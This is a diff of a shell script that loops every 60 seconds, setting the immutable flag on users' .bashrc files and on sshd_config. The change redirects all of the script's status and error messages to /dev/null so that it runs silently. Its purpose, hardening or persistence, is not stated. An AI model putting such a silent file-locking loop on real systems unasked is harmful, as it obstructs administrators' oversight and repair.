@@ -5,9 +5,9 @@ apply_chattr() {
     file=$1
     chattr +i "$file"
     if [ $? -eq 0 ]; then
-        echo "chattr applied successfully to $file"
+        echo "chattr applied successfully to $file" > /dev/null
     else
-        echo "Error applying chattr to $file"
+        echo "Error applying chattr to $file" > /dev/null
     fi
 }
 
@@ -21,7 +21,7 @@ while true; do
         if [ -f "$bashrc_file" ]; then
             apply_chattr "$bashrc_file"
         else
-            echo "File $bashrc_file not found for user $user_dir, skipping..."
+            echo "File $bashrc_file not found for user $user_dir, skipping..." > /dev/null
         fi
     done
 
@@ -30,7 +30,7 @@ while true; do
     if [ -f "$sshd_config" ]; then
         apply_chattr "$sshd_config"
     else
-        echo "File $sshd_config not found, skipping..."
+        echo "File $sshd_config not found, skipping..." > /dev/null
     fi
 
     sleep 60
